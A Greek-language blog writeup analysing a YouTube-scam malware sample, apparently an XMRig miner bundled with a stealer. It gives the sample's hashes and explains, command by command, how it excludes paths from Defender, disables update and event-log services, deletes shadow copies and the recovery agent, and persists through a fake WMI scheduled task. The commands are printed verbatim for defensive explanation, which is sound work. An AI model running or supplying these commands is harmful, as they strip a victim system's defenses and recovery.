---
title: Κυνηγώντας τους Απατεώνες
date: 01-02-2026
category: Writeup
description: Σ01 Ε02
link: --
---


Καλησπέρα και καλή χρονιά. Μετά από αρκετό καιρό συνεχίζουμε το κυνήγι των απατεώνων του Youtube.  
Αυτή τη φορά θα επικεντρωθούμε μόνο στον ιό και όχι στο κανάλι και θα αναλύσουμε κάθε εντολή που εκτελείται από τον ιό οπότε ετοιμαστείτε.

Αρχικά παραθέτω τις ψηφιακές υπογραφές του συγκεκριμένου αρχείου ώστε να μπορείτε να το ψάξετε κι εσείς εφόσον το επιθυμείτε.

**MD5**: f40fddf55be9495ca6edee1654aadbed

**SHA1**: acd5ce29811e44a699a8a51e3dd442051a6d1db9

**SHA256**: 7ce796c836d61ce3594bee77bcf32f4ead1a4aa315739078f76a31f1eaf1cdd4

**SHA512**:
```
f15937a9e325f7f08b8c381b58f67dbb8fd2b49e49aea266b6d66e15e9fb6efa5ea82624eef072d808c3a263ef04b21727c2b4d845b0af9521a42a447054fa08
```

**SSDEEP**:
393216:c123X/zobDMNqMgD/Nx1g6qxeJofmHu3FnQOqHi1o:z3roHoqvD/NxS6nofm26Cm


### XMRIG
Ένα από τα payloads του ιού είναι το XMRIG. Πρόκειται για έναν miner ανοικτού λογισμικού ο οποίος μάλιστα υπάρχει και στο GitHub [ΕΔΩ][https://github.com/xmrig/xmrig]. Οι miners  ουσιαστικά χρησιμοποιούν το hardware του υπολογιστή ώστε να "μαζέψουν" κρυπτονομίσματα. Αυτός είναι ένας πολύ απλοποιημένος ορισμός, ωστόσο. Στην περίπτωσή μας το XMrig βγάζει λεφτά για τους επιτιθέμενους χρησιμοποιώντας τους πολύτιμους πόρους του δικού μας συστήματος με αποτέλεσμα να το επιβραδύνει σημαντικά.


## STEALER/BROWSER SPYWARE
Η πρώτη διεργασία συνήθως ένας τέτοιου τύπου είναι να ψάξει τους περιηγητές μας για το ιστορικό (όπλο για χειραγώγηση του θύματος αργότερα), τους κωδικούς και τα cookies. Τα δύο τελευταία είναι αλληλένδετα. Έχουν σκοπό την κλοπή των λογαριασμών μας σε διάφορες ιστοσελίδες. Τα cookies όμως έχουν ένα πλεονέκτημα έναντι των απλών κωδικών πρόσβασης. Παρακάμπτουν την αυθεντικοποίηση σε δύο βήματα και έτσι η πρόσβαση είναι πιο εύκολη και δεν γίνεται άμεσα αντιληπτή η παραβίαση. 


# ΕΝΤΟΛΕΣ 

Αφού, λοιπόν, μας έκλεψε τους κωδικούς και τα cookies τώρα εδραιώνεται στο σύστημά μας απενεργοποιώντας συστήματα ασφαλείας και εντοπισμού απειλών. Αυτά επιτυγχάνονται ως εξής:
Όλα ξεκινούν με το παρακάτω αρχείο το οποίο είναι παράγωγο του αρχικού (ένα από τα παράγωγα.) και εμφανίζεται στον φάκελο Temp του συστήματος.

```
C:\Users\Admin\AppData\Local\Temp\Bp6Wk93Jb4zGc5Wf.exe
```

Τώρα ετοιμαστείτε γιατί έχουμε τις εντολές που είναι και το ζουμί της υπόθεσης. Θα προσπαθήσω να τις εξηγήσω όσο καλύτερα μπορώ.

## ΔΙΚΑΙΩΜΑΤΑ ΔΙΑΧΕΙΡΙΣΤΗ

```
cmd.exe /C net session >nul 2>&1
```

```
net session
```

```
C:\Windows\system32\net1 session
```

Αυτές οι 3 εντολές κάνουν το ίδιο ακριβώς αλλά με διαφορετικό τρόπο. Ελέγχουν αν το `Setup.exe` που εκτελέσαμε στην αρχή, έχει εκτελεστεί με δικαιώματα διαχειριστή. Υπάρχουν πολλοί λόγοι για να γίνει αυτό με 3 εντολές αντί μιας. Ο ένας είναι το λειτουργικό σύστημα ίσως είναι πιο παλιό και δεν έχει τα ίδια εργαλεία διαθέσιμα. Ο άλλος είναι για να είναι σίγουρος ο επιτιθέμενος πως θα επιτευχθεί ο σκοπός, δηλαδή ο έλεγχος του εύρους δικαιωμάτων ώστε στην συνέχεια να πράξει ανάλογα. 

-------------------------------------------------------------------------

## WINDOWS DEFENDER

```
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath 'C:\Users\'; Add-MpPreference -ExclusionPath 'C:\ProgramData\'; Add-MpPreference -ExclusionPath 'C:\Windows\'; Add-MpPreference -ExclusionExtension '.exe'; Add-MpPreference -ExclusionExtension '.sys'
```
Εδώ έχουμε κάτι πολύ πιο σοβαρό που αναφέραμε στην αρχή. Την απενεργοποίηση των αμυνών. Ας το πάρουμε όμως με τη σειρά.
Η εντολή καλεί το `powershell.exe` του οποίου το παράθυρο θα είναι κρυμμένο `-WindowStyle Hidden` και το χρησιμοποιεί για να προσθέσει εξαιρέσεις στον Windows Defender. Οι εξαιρέσεις αυτές ουσιαστικά δεν θα περάσουν από έλεγχο από τον Defender. Πρόκειται για τους παρακάτω καταλόγους:
```
C:\Users\
C:\ProgramData\
C:\Windows\
```
αλλά και τις παρακάτω επεκτάσεις αρχείων που πάλι δεν θα ελέγξει ο Defender:
```
.sys
.exe
```

Η παράμετρος `-ExecutionPolicy Bypass` παρακάμπτει περιορισμούς ασφαλείας του powershell.

Η παράμετρος `Add-MpPreference` αλλάζει τις ρυθμίσεις του Defender.

--------------------------------------------------------------------------

### WINDOWS UPDATE

 ```
 sc.exe stop wuauserv
 ```
 Το `sc.exe` είναι το Service Control (έλεγχος υπηρεσιών των Windows) και εδώ το βλέπουμε να απενεργοποιεί το Windows Update. Έτσι αποκλείει πιθανές διορθώσεις ευπαθειών και κρατάει το σύστημα ευάλωτο.

```
sc.exe config wuauserv start= disabled
```
Μετά από αυτό, το Windows Update δεν θα ξανά ξεκινήσει ό,τι κι αν δοκιμάσει ο χρήστης.


```
sc.exe stop UsoSvc
```
Απενεργοποίηση της υπηρεσίας Orchestrator του Windows Update που του επιτρέπει να επανεκκινείται αυτόματα και γενικά να έχει μια αυτονομία στη λήψη και εγκατάσταση ενημερώσεων. Είναι λοιπόν άμεσα συνδεδεμένη με την προηγούμενη εντολή ` sc.exe stop wuauserv`

```
sc.exe config UsoSvc start= disabled
```
To Orchestrator του Windows Update τώρα δεν θα μπορεί να ξεκινήσει.

```
sc.exe stop bits
```
Απενεργοποίηση δυνατότητας λήψης ενημερώσεων μέσω HTTP και SMB σέρβερ. 

```
sc.exe config bits start= disabled
```
Απενεργοποίηση δυνατότητας εκκίνησης της υπηρεσίας `bits`

```
sc.exe stop dosvc
```
Απενεργοποίηση της υπηρεσίας `dosvc` που χρησιμοποιείται από το Windows Update για κοινή χρήση ενημερώσεων μέσω τοπικών δικτύων. Αποτέλεσμα: Ακόμα πιο αδύναμο σύστημα.

```
sc.exe config dosvc start= disabled
```
Απενεργοποιείται η δυνατότητα εκκίνησης της υπηρεσίας `dosvc`

```
sc.exe stop WaaSMedicSvc
```
Απενεργοποίηση της υπηρεσίας `WaaSMedicSvc` η οποία χρησιμοποιείται για να επιδιορθώσει, αυτόματα, σφάλματα του Windows Update.

```
sc.exe config WaaSMedicSvc start= disabled
```
Απενεργοποιείται η δυνατότητα εκκίνησης της υπηρεσίας 'WaaSMedicSvc'

--------------------------------------------------------------------------

## EVENT LOG

```
sc.exe stop eventlog
```
Απενεργοποίηση του Event Logger το οποίο καταγράφει συμβάντα των Windows. Έτσι, δεν θα υπάρχει κανένα στοιχείο για τις πράξεις του ιού οπότε μελλοντικές προσπάθειες ανάλυσης δυσκολεύουν.

```
sc.exe config eventlog start= disabled
```
Απενεργοποιείται η δυνατότητα εκκίνησης του Event Logger.

--------------------------------------------------------------------------

## IIS

```
cmd.exe /C rmdir /S /Q "C:\\inetpub" 2>nul
```
Διαγραφή του καταλόγου `inetpup` ο οποίος ανήκει στον IIS σέρβερ της Microsoft και πολλές φορές περιέχει logs. Η  διαγραφή γίνεται κρυφά `/Q` και αφαιρώντας φυσικά και υποκαταλόγους `/S`. Σφάλματα αυτής της διαδικασίας δεν θα γίνουν αντιληπτά `2>null`. 

--------------------------------------------------------------------------

## ΚΙ ΑΛΛΟ  WINDOWS UPDATE...

```
cmd.exe /c wusa /uninstall /kb:890830 /quiet /norestart >nul 2>&1
```
Εκτελεί ένα κρυφό παράθυρο cmd με την εντολή:
```
wusa /uninstall /kb:890830 /quiet /norestart
```
η οποία αφαιρεί μια ενημέρωση που σχετίζεται με το εργαλείο των Windows: Windows Malware Removal Tool. Την συγκεκριμένη εντολή την είχαμε ξαναδεί στο προηγούμενο επεισόδιο.

--------------------------------------------------------------------------
## RECOVERY ΤΕΛΟΣ!!

```
cmd.exe /c "reagentc.exe /disable >nul 2>&1 && takeown /f "C:\Windows\System32\reagentc.exe" >nul 2>&1 && icacls "C:\Windows\System32\reagentc.exe" /grant administrators:F >nul 2>&1 && del /f /q "C:\Windows\System32\reagentc.exe" >nul 2>&1
```
Εδώ έχουμε 4 εντολές με στόχο το Windows Recovery Agent (reagentc.exe) (Εργαλείο των Windows που χρησιμοποιείται για reset του υπολογιστή, για δημιουργία restore point και για τα Advanced Boot Options). Πάμε με τη σειρά.

Πάλι χρησιμοποιείται το `cmd.exe` και έχουμε:
```
reagentc.exe /disable >nul 2>&1
```
Απενεργοποίηση του `reagent.exe`

```
takeown /f "C:\Windows\System32\reagentc.exe
```
Πριν από αυτή την εντολή το `reagentc.exe` ανήκει και προστατεύεται από τα windows. Μετά από αυτή, η ιδιοκτησία παραδίδεται στο malware επιτρέποντάς του να το τροποποιήσει ή και να το διαγράψει.

```
icacls C:\Windows\System32\reagentc.exe /grant administrators:F
```
Τώρα η ιδιοκτησία παραχωρείται στους Administrators του συστήματος. Μπορεί αυτό να φαίνεται θετικό αλλά θυμηθείτε πως στους Administrators ανήκει και το malware πλέον. 

Και τέλος έχουμε την οριστική διαγραφή του `reagentc.exe`
```
del /f /q C:\Windows\System32\reagentc.exe
```

--------------------------------------------------------------------------
## BACKUPS ΤΕΛΟΣ!

```
cmd.exe /c vssadmin delete shadows /all /quiet
```
Τώρα διαγράφονται οποιαδήποτε backups, restore points, shadow copies (προηγούμενες εκδόσεις αρχείων) από το `vssadmin` που είναι ο διαχειριστής των shadow copies και των backups.

--------------------------------------------------------------------------

## ΕΔΡΑΙΩΣΗ ΚΥΡΙΑΡΧΙΑΣ

```
schtasks.exe /create /sc onstart /tn "WMI Provider Host" /tr "C:\ProgramData\Microsoft\WinMSIPS.{208D2C60-3AEA-1069-A2D7-08002B30309D}\WmiPrvSE.exe" /ru "system" /rl highest /f
```
Εδώ το malware βάζει τον εαυτό του στις προγραμματισμένες διεργασίες (scheduled tasks) που τρέχουν σε κάθε εκκίνηση του υπολογιστή `/sc onstart`. Μάλιστα του δίνει και ένα φαινομενικά legit όνομα `WMI Provider Host`. Η μόνη διαφορά είναι ο κατάλογος που τα φιλοξενεί.
Κανονικό WMI Provider Host
```
C:\Windows\System32\wbem\WmiPrvSE.exe
```

Ψεύτικο
```
C:\ProgramData\Microsoft\WinMSIPS.{208D2C60-3AEA-1069-A2D7-08002B30309D}\WmiPrvSE.exe
```

Να σημειωθεί εδώ πως ο κωδικός '208D2C60-3AEA-1069-A2D7-08002B30309D' είναι για να φαίνεται όσο πιο 'νόμιμο' γίνεται καθώς τέτοιοι κωδικοί χρησιμοποιούνται συχνά από την Microsoft σαν ταυτότητες.

## ΕΠΑΝΑΛΗΨΗ

Κάπου εδώ οι εντολές τελειώνουν και αρχίζει κάτι παράξενο.
Βλέπετε, το malware δημιουργεί 3 νέα εκτελέσιμα αρχεία στο κατάλογο Temp, στην συνέχεια διαγράφει το ένα και τέλος εκτελεί τις ίδιες εντολές από την αρχή. Έτσι ακόμα κι ένα από αρχεία του διαγραφεί ή εντοπιστεί, κάποιο άλλο θα πάρει τη θέση του και θα ολοκληρώσει το έργο.


## ΣΥΝΔΕΣΕΙΣ

Αυτός είναι ένας τομέας ο οποίος χρήζει περαιτέρω διερεύνησης καθώς πρόκειται για τα αιτήματα που κάνει ο ιός σε διάφορες ιστοσελίδες. Προφανώς μια από αυτές ή ακόμα και όλες αυτές θα είναι το κέντρο ελέγχου του ιού. Εκεί, δηλαδή, καταλήγουν οι πληροφορίες από τα συστήματα που μολύνονται αλλά και από κει δέχεται εντολές ο ιός. Θα παραθέσω κάποια από αυτά τα URL φιλτραρισμένα για λόγους ασφαλείας.

```
ip-api[.]com
globaleliteconsulting24[.]com
hurtohjertuihjriotujhrth[.]com  
han-suck-soo-apologizes[.]com
```



## ΕΠΙΛΟΓΟΣ

Αυτό το ήταν το πιο λεπτομερές από όλα μου τα άρθρα μέχρι τώρα. Προφανώς θα συνεχιστούν και ελπίζω σύντομα να γράψω άρθρο με Reverse Engineering τέτοιου ιού, ωστόσο κάτι τέτοιο είναι χρονοβόρο και αρκετά δύσκολο οπότε υπομονή :)



